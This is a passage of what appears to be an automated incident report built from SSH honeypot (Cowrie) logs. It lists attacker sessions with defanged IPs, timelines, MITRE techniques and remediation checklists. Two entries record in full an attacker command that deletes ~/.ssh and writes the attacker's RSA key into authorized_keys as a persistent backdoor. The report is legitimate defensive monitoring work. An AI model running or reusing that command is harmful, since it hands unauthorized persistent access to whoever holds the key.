| `2026-07-04 19:08:56` | `cowrie.session.params` |
| `2026-07-04 19:08:56` | `cowrie.command.input` |
| `2026-07-04 19:08:56` | `cowrie.log.closed` |
| `2026-07-04 19:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcc9c8f703c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:09 |
| **Last Seen** | 2026-07-04 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:09:00` | `cowrie.session.connect` |
| `2026-07-04 19:09:00` | `cowrie.client.version` |
| `2026-07-04 19:09:00` | `cowrie.client.kex` |
| `2026-07-04 19:09:00` | `cowrie.login.success` |
| `2026-07-04 19:09:01` | `cowrie.session.params` |
| `2026-07-04 19:09:01` | `cowrie.command.input` |
| `2026-07-04 19:09:01` | `cowrie.log.closed` |
| `2026-07-04 19:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff7df38dd9b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:09 |
| **Last Seen** | 2026-07-04 19:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:09:05` | `cowrie.session.connect` |
| `2026-07-04 19:09:05` | `cowrie.client.version` |
| `2026-07-04 19:09:05` | `cowrie.client.kex` |
| `2026-07-04 19:09:06` | `cowrie.login.success` |
| `2026-07-04 19:09:07` | `cowrie.session.params` |
| `2026-07-04 19:09:07` | `cowrie.command.input` |
| `2026-07-04 19:09:07` | `cowrie.log.closed` |
| `2026-07-04 19:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3c3094fa75b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:09 |
| **Last Seen** | 2026-07-04 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:09:10` | `cowrie.session.connect` |
| `2026-07-04 19:09:10` | `cowrie.client.version` |
| `2026-07-04 19:09:10` | `cowrie.client.kex` |
| `2026-07-04 19:09:11` | `cowrie.login.success` |
| `2026-07-04 19:09:11` | `cowrie.session.params` |
| `2026-07-04 19:09:11` | `cowrie.command.input` |
| `2026-07-04 19:09:11` | `cowrie.log.closed` |
| `2026-07-04 19:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3011d30e08fc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:09 |
| **Last Seen** | 2026-07-04 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:09:16` | `cowrie.session.connect` |
| `2026-07-04 19:09:16` | `cowrie.client.version` |
| `2026-07-04 19:09:16` | `cowrie.client.kex` |
| `2026-07-04 19:09:16` | `cowrie.login.success` |
| `2026-07-04 19:09:17` | `cowrie.session.params` |
| `2026-07-04 19:09:17` | `cowrie.command.input` |
| `2026-07-04 19:09:17` | `cowrie.log.closed` |
| `2026-07-04 19:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9388f6bc57fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:09 |
| **Last Seen** | 2026-07-04 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:09:21` | `cowrie.session.connect` |
| `2026-07-04 19:09:21` | `cowrie.client.version` |
| `2026-07-04 19:09:21` | `cowrie.client.kex` |
| `2026-07-04 19:09:22` | `cowrie.login.success` |
| `2026-07-04 19:09:22` | `cowrie.session.params` |
| `2026-07-04 19:09:22` | `cowrie.command.input` |
| `2026-07-04 19:09:23` | `cowrie.log.closed` |
| `2026-07-04 19:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4a25a8d767d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:09 |
| **Last Seen** | 2026-07-04 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:09:26` | `cowrie.session.connect` |
| `2026-07-04 19:09:26` | `cowrie.client.version` |
| `2026-07-04 19:09:26` | `cowrie.client.kex` |
| `2026-07-04 19:09:27` | `cowrie.login.success` |
| `2026-07-04 19:09:28` | `cowrie.session.params` |
| `2026-07-04 19:09:28` | `cowrie.command.input` |
| `2026-07-04 19:09:28` | `cowrie.log.closed` |
| `2026-07-04 19:09:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-049f177d49ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:09 |
| **Last Seen** | 2026-07-04 19:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:09:32` | `cowrie.session.connect` |
| `2026-07-04 19:09:32` | `cowrie.client.version` |
| `2026-07-04 19:09:32` | `cowrie.client.kex` |
| `2026-07-04 19:09:33` | `cowrie.login.success` |
| `2026-07-04 19:09:34` | `cowrie.session.params` |
| `2026-07-04 19:09:34` | `cowrie.command.input` |
| `2026-07-04 19:09:34` | `cowrie.log.closed` |
| `2026-07-04 19:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f96b070571d8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 19:13 |
| **Last Seen** | 2026-07-04 19:14 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:13:53` | `cowrie.session.connect` |
| `2026-07-04 19:13:55` | `cowrie.client.version` |
| `2026-07-04 19:13:55` | `cowrie.client.kex` |
| `2026-07-04 19:14:01` | `cowrie.login.success` |
| `2026-07-04 19:14:05` | `cowrie.session.params` |
| `2026-07-04 19:14:05` | `cowrie.command.input` |
| `2026-07-04 19:14:07` | `cowrie.log.closed` |
| `2026-07-04 19:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e14a535c5722

| Field | Detail |
|---|---|
| **Source IP** | `104.218.164[.]192` |
| **First Seen** | 2026-07-04 19:19 |
| **Last Seen** | 2026-07-04 19:20 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:19:48` | `cowrie.session.connect` |
| `2026-07-04 19:19:48` | `cowrie.login.success` |
| `2026-07-04 19:19:48` | `cowrie.session.params` |
| `2026-07-04 19:20:07` | `cowrie.log.closed` |
| `2026-07-04 19:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.218.164[.]192` to AbuseIPDB if not already reported
- [ ] Block `104.218.164[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e691a04776f

| Field | Detail |
|---|---|
| **Source IP** | `104.218.164[.]192` |
| **First Seen** | 2026-07-04 19:20 |
| **Last Seen** | 2026-07-04 19:20 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0[.]0 Safari/537.36 Edg/120.0.0[.]0` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:20:25` | `cowrie.session.connect` |
| `2026-07-04 19:20:25` | `cowrie.login.success` |
| `2026-07-04 19:20:25` | `cowrie.session.params` |
| `2026-07-04 19:20:25` | `cowrie.command.input` |
| `2026-07-04 19:20:25` | `cowrie.command.failed` |
| `2026-07-04 19:20:25` | `cowrie.command.input` |
| `2026-07-04 19:20:25` | `cowrie.command.input` |
| `2026-07-04 19:20:44` | `cowrie.log.closed` |
| `2026-07-04 19:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.218.164[.]192` to AbuseIPDB if not already reported
- [ ] Block `104.218.164[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80002661c618

| Field | Detail |
|---|---|
| **Source IP** | `104.218.164[.]192` |
| **First Seen** | 2026-07-04 19:20 |
| **Last Seen** | 2026-07-04 19:21 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:20:44` | `cowrie.session.connect` |
| `2026-07-04 19:20:44` | `cowrie.login.success` |
| `2026-07-04 19:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.218.164[.]192` to AbuseIPDB if not already reported
- [ ] Block `104.218.164[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d75428acb4

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 19:25 |
| **Last Seen** | 2026-07-04 19:25 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:25:44` | `cowrie.session.connect` |
| `2026-07-04 19:25:46` | `cowrie.client.version` |
| `2026-07-04 19:25:46` | `cowrie.client.kex` |
| `2026-07-04 19:25:52` | `cowrie.login.success` |
| `2026-07-04 19:25:56` | `cowrie.session.params` |
| `2026-07-04 19:25:56` | `cowrie.command.input` |
| `2026-07-04 19:25:58` | `cowrie.log.closed` |
| `2026-07-04 19:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b4d5d1c8e9d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 19:28 |
| **Last Seen** | 2026-07-04 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:28:38` | `cowrie.session.connect` |
| `2026-07-04 19:28:38` | `cowrie.client.version` |
| `2026-07-04 19:28:38` | `cowrie.client.kex` |
| `2026-07-04 19:28:38` | `cowrie.login.success` |
| `2026-07-04 19:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-263b36470c18

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 19:28 |
| **Last Seen** | 2026-07-04 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:28:39` | `cowrie.session.connect` |
| `2026-07-04 19:28:39` | `cowrie.client.version` |
| `2026-07-04 19:28:39` | `cowrie.client.kex` |
| `2026-07-04 19:28:39` | `cowrie.login.success` |
| `2026-07-04 19:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd83896d49a1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 19:28 |
| **Last Seen** | 2026-07-04 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:28:39` | `cowrie.session.connect` |
| `2026-07-04 19:28:39` | `cowrie.client.version` |
| `2026-07-04 19:28:39` | `cowrie.client.kex` |
| `2026-07-04 19:28:39` | `cowrie.login.success` |
| `2026-07-04 19:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5e58b702ae

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 19:28 |
| **Last Seen** | 2026-07-04 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:28:39` | `cowrie.session.connect` |
| `2026-07-04 19:28:39` | `cowrie.client.version` |
| `2026-07-04 19:28:39` | `cowrie.client.kex` |
| `2026-07-04 19:28:40` | `cowrie.login.success` |
| `2026-07-04 19:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-548a2151b44e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 19:32 |
| **Last Seen** | 2026-07-04 19:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:32:55` | `cowrie.session.connect` |
| `2026-07-04 19:32:55` | `cowrie.client.version` |
| `2026-07-04 19:32:55` | `cowrie.client.kex` |
| `2026-07-04 19:32:56` | `cowrie.login.success` |
| `2026-07-04 19:32:56` | `cowrie.session.params` |
| `2026-07-04 19:32:56` | `cowrie.command.input` |
| `2026-07-04 19:32:57` | `cowrie.log.closed` |
| `2026-07-04 19:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ae0a444734d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 19:37 |
| **Last Seen** | 2026-07-04 19:37 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:37:37` | `cowrie.session.connect` |
| `2026-07-04 19:37:38` | `cowrie.client.version` |
| `2026-07-04 19:37:38` | `cowrie.client.kex` |
| `2026-07-04 19:37:44` | `cowrie.login.success` |
| `2026-07-04 19:37:48` | `cowrie.session.params` |
| `2026-07-04 19:37:48` | `cowrie.command.input` |
| `2026-07-04 19:37:50` | `cowrie.log.closed` |
| `2026-07-04 19:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a410aeabaa1

| Field | Detail |
|---|---|
| **Source IP** | `125.16.27[.]190` |
| **First Seen** | 2026-07-04 19:41 |
| **Last Seen** | 2026-07-04 19:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:41:21` | `cowrie.session.connect` |
| `2026-07-04 19:41:21` | `cowrie.client.version` |
| `2026-07-04 19:41:21` | `cowrie.client.kex` |
| `2026-07-04 19:41:22` | `cowrie.login.success` |
| `2026-07-04 19:41:23` | `cowrie.session.params` |
| `2026-07-04 19:41:23` | `cowrie.command.input` |
| `2026-07-04 19:41:23` | `cowrie.command.failed` |
| `2026-07-04 19:41:23` | `cowrie.log.closed` |
| `2026-07-04 19:41:24` | `cowrie.session.params` |
| `2026-07-04 19:41:24` | `cowrie.command.input` |
| `2026-07-04 19:41:25` | `cowrie.session.file_download` |
| `2026-07-04 19:41:25` | `cowrie.log.closed` |
| `2026-07-04 19:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.27[.]190` to AbuseIPDB if not already reported
- [ ] Block `125.16.27[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e09463def83e

| Field | Detail |
|---|---|
| **Source IP** | `125.16.27[.]190` |
| **First Seen** | 2026-07-04 19:41 |
| **Last Seen** | 2026-07-04 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:41:25` | `cowrie.session.connect` |
| `2026-07-04 19:41:25` | `cowrie.client.version` |
| `2026-07-04 19:41:25` | `cowrie.client.kex` |
| `2026-07-04 19:41:26` | `cowrie.login.success` |
| `2026-07-04 19:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.27[.]190` to AbuseIPDB if not already reported
- [ ] Block `125.16.27[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab13ed2042ca

| Field | Detail |
|---|---|
| **Source IP** | `125.16.27[.]190` |
| **First Seen** | 2026-07-04 19:41 |
| **Last Seen** | 2026-07-04 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:41:27` | `cowrie.session.connect` |
| `2026-07-04 19:41:27` | `cowrie.client.version` |
| `2026-07-04 19:41:27` | `cowrie.client.kex` |
| `2026-07-04 19:41:28` | `cowrie.login.success` |
| `2026-07-04 19:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.27[.]190` to AbuseIPDB if not already reported
- [ ] Block `125.16.27[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed063b36fa22

| Field | Detail |
|---|---|
| **Source IP** | `152.32.218[.]149` |
| **First Seen** | 2026-07-04 19:46 |
| **Last Seen** | 2026-07-04 19:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:46:26` | `cowrie.session.connect` |
| `2026-07-04 19:46:26` | `cowrie.client.version` |
| `2026-07-04 19:46:26` | `cowrie.client.kex` |
| `2026-07-04 19:46:27` | `cowrie.login.success` |
| `2026-07-04 19:46:28` | `cowrie.session.params` |
| `2026-07-04 19:46:28` | `cowrie.command.input` |
| `2026-07-04 19:46:28` | `cowrie.command.failed` |
| `2026-07-04 19:46:28` | `cowrie.log.closed` |
| `2026-07-04 19:46:29` | `cowrie.session.params` |
| `2026-07-04 19:46:29` | `cowrie.command.input` |
| `2026-07-04 19:46:30` | `cowrie.session.file_download` |
| `2026-07-04 19:46:30` | `cowrie.log.closed` |
| `2026-07-04 19:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `152.32.218[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-503c1f06367c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.218[.]149` |
| **First Seen** | 2026-07-04 19:46 |
| **Last Seen** | 2026-07-04 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:46:30` | `cowrie.session.connect` |
| `2026-07-04 19:46:30` | `cowrie.client.version` |
| `2026-07-04 19:46:30` | `cowrie.client.kex` |
| `2026-07-04 19:46:31` | `cowrie.login.success` |
| `2026-07-04 19:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `152.32.218[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-244b1cafe901

| Field | Detail |
|---|---|
| **Source IP** | `152.32.218[.]149` |
| **First Seen** | 2026-07-04 19:46 |
| **Last Seen** | 2026-07-04 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:46:31` | `cowrie.session.connect` |
| `2026-07-04 19:46:31` | `cowrie.client.version` |
| `2026-07-04 19:46:32` | `cowrie.client.kex` |
| `2026-07-04 19:46:33` | `cowrie.login.success` |
| `2026-07-04 19:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `152.32.218[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-835189be48db

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 19:49 |
| **Last Seen** | 2026-07-04 19:49 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:49:21` | `cowrie.session.connect` |
| `2026-07-04 19:49:22` | `cowrie.client.version` |
| `2026-07-04 19:49:22` | `cowrie.client.kex` |
| `2026-07-04 19:49:29` | `cowrie.login.success` |
| `2026-07-04 19:49:33` | `cowrie.session.params` |
| `2026-07-04 19:49:33` | `cowrie.command.input` |
| `2026-07-04 19:49:34` | `cowrie.log.closed` |
| `2026-07-04 19:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
